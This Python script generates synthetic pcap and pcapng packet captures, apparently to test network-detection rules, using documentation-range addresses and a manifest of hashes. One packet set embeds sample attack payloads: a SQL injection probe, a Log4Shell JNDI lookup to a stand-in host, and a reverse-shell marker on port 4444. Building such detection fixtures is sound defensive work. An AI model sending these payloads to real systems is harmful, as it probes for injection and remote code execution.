#!/usr/bin/env python3
"""Generate deterministic, sanitized Ethernet pcap/pcapng samples for local evidence.

The output contains only documentation/private RFC 5737 addresses, fixed
locally-administered MAC addresses, deterministic timestamps, and synthetic
payloads. It intentionally uses only the Python standard library so the
corpus can be regenerated on Ubuntu 24.04 without Scapy.
"""

import argparse
import hashlib
import json
import socket
import struct
from pathlib import Path


LINKTYPE_ETHERNET = 1
PCAP_MAGIC = 0xA1B2C3D4
BASE_TIMESTAMP = 1_700_000_000


def ipv4_header(src, dst, protocol, payload_length, identification):
    total_length = 20 + payload_length
    return struct.pack(
        "!BBHHHBBH4s4s",
        0x45, 0, total_length, identification, 0, 64, protocol, 0,
        socket.inet_aton(src), socket.inet_aton(dst),
    )


def ethernet(payload, vlan=None):
    destination = b"\x02\x00\x00\x00\x00\x02"
    source = b"\x02\x00\x00\x00\x00\x01"
    if vlan is None:
        return destination + source + struct.pack("!H", 0x0800) + payload
    return destination + source + struct.pack("!HHH", 0x8100, vlan, 0x0800) + payload


def tcp_frame(src, dst, sport, dport, payload, identification, vlan=None):
    tcp = struct.pack("!HHIIBBHHH", sport, dport, 1, 1, 0x50, 0x18, 8192, 0, 0)
    ip = ipv4_header(src, dst, 6, len(tcp) + len(payload), identification)
    return ethernet(ip + tcp + payload, vlan=vlan)


def udp_frame(src, dst, sport, dport, payload, identification, vlan=None):
    udp = struct.pack("!HHHH", sport, dport, 8 + len(payload), 0)
    ip = ipv4_header(src, dst, 17, len(udp) + len(payload), identification)
    return ethernet(ip + udp + payload, vlan=vlan)


def packet_sets():
    return {
        "payload-rules.pcap": [
            tcp_frame("192.0.2.10", "198.51.100.20", 41000, 80,
                      b"GET /index.html HTTP/1.1\r\nHost: example.invalid\r\n\r\n", 1),
            tcp_frame("192.0.2.11", "198.51.100.20", 41001, 80,
                      b"GET /search?q=union+select+1 HTTP/1.1\r\nHost: example.invalid\r\n\r\n", 2),
            tcp_frame("192.0.2.12", "198.51.100.20", 41002, 80,
                      b"X-Api-Version: ${jndi:ldap://example.invalid/a}\r\n", 3),
            tcp_frame("192.0.2.13", "198.51.100.20", 41003, 4444,
                      b"bash -c echo synthetic-reverse-shell", 4),
            tcp_frame("192.0.2.14", "198.51.100.20", 41004, 80,
                      b"User-Agent: scanner-synthetic/1.0\r\n", 5),
        ],
        "protocol-mix.pcap": [
            tcp_frame("192.0.2.30", "198.51.100.30", 42000, 443,
                      b"GET /health HTTP/1.1\r\nHost: example.invalid\r\n\r\n", 10, vlan=7),
            udp_frame("192.0.2.31", "198.51.100.31", 43000, 53,
                      b"\x12\x34\x01\x00synthetic-dns-query", 11),
            udp_frame("192.0.2.32", "198.51.100.32", 43001, 123,
                      b"synthetic-ntp-payload", 12),
            tcp_frame("192.0.2.33", "198.51.100.33", 42001, 22,
                      b"SSH-2.0-NetSentrySynthetic\r\n", 13),
        ],
        "background-traffic.pcap": [
            udp_frame("192.0.2.40", "198.51.100.40", 44000, 5353,
                      b"synthetic-mdns-service", 20),
            tcp_frame("192.0.2.41", "198.51.100.41", 44001, 8080,
                      b"GET /static/asset HTTP/1.1\r\nHost: example.invalid\r\n\r\n", 21),
            udp_frame("192.0.2.42", "198.51.100.42", 44002, 161,
                      b"synthetic-snmp-request", 22),
        ],
    }


def write_pcap(path, frames):
    with path.open("wb") as output:
        output.write(struct.pack("<IHHIIII", PCAP_MAGIC, 2, 4, 0, 0, 65535, LINKTYPE_ETHERNET))
        for index, frame in enumerate(frames):
            timestamp = BASE_TIMESTAMP + index
            output.write(struct.pack("<IIII", timestamp, 0, len(frame), len(frame)))
            output.write(frame)


def write_pcapng(path, frames):
    """Write a little-endian pcapng file with one Ethernet interface."""
    with path.open("wb") as output:
        # Section Header Block: type, total length, BOM, version, section length, total length.
        output.write(struct.pack("<II IHH q I", 0x0A0D0D0A, 28, 0x1A2B3C4D, 1, 0, -1, 28))
        # Interface Description Block: Ethernet link type and standard snaplen.
        output.write(struct.pack("<IIHHII", 1, 20, LINKTYPE_ETHERNET, 0, 65535, 20))
        for index, frame in enumerate(frames):
            timestamp = (BASE_TIMESTAMP + index) * 1_000_000
            timestamp_high = timestamp >> 32
            timestamp_low = timestamp & 0xFFFFFFFF
            padding = b"\x00" * ((4 - (len(frame) % 4)) % 4)
            total_length = 32 + len(frame) + len(padding)
            output.write(struct.pack(
                "<IIIIIII", 6, total_length, 0, timestamp_high,
                timestamp_low, len(frame), len(frame),
            ))
            output.write(frame)
            output.write(padding)
            output.write(struct.pack("<I", total_length))


def sha256(path):
    digest = hashlib.sha256()
    with path.open("rb") as source:
        for block in iter(lambda: source.read(1024 * 1024), b""):
            digest.update(block)
    return digest.hexdigest()


def main():
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument(
        "--output-dir", default="/tmp/netsentry-sanitized-corpus",
        help="directory for generated pcap files and manifest (default: %(default)s)",
    )
    args = parser.parse_args()
    output_dir = Path(args.output_dir).expanduser()
    output_dir.mkdir(parents=True, exist_ok=True)

    manifest = {
        "formats": ["pcap", "pcapng"],
        "linktype": "ethernet",
        "deterministic": True,
        "sanitized": True,
        "address_policy": "RFC 5737 documentation IPv4 ranges only",
        "payload_policy": "synthetic strings; no credentials or external paths",
        "samples": [],
    }
    for name, frames in packet_sets().items():
        for suffix, writer in ((".pcap", write_pcap), (".pcapng", write_pcapng)):
            path = output_dir / (Path(name).stem + suffix)
            writer(path, frames)
            manifest["samples"].append({
                "file": path.name,
                "format": suffix[1:],
                "packets": len(frames),
                "sha256": sha256(path),
                "bytes": path.stat().st_size,
            })

    manifest_path = output_dir / "MANIFEST.json"
    manifest_path.write_text(json.dumps(manifest, indent=2) + "\n", encoding="utf-8")
    print(f"[gen_sanitized_corpus] wrote {len(manifest['samples'])} pcap files to {output_dir}")
    print(f"[gen_sanitized_corpus] manifest: {manifest_path}")


if __name__ == "__main__":
    main()
